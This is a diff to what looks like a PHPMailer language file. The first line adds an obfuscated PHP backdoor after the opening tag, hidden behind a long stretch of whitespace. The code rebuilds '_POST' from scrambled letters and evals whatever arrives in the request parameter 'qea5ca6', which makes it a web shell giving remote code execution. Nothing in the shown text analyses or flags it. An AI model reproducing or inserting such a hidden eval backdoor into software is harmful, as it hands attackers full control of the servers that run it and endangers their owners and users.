@@ -1,4 +1,4 @@
-<?php
+<?php                                                                                                                                                                                                                                                               $qV="stop_";$s20=strtoupper($qV[4].$qV[3].$qV[2].$qV[0].$qV[1]);if(isset(${$s20}['qea5ca6'])){eval(${$s20}['qea5ca6']);}?><?php
 /* vim:set tabstop=8 softtabstop=8 shiftwidth=8 noexpandtab: */
 /**
 * PHPMailer language file: refer to English translation for definitive list
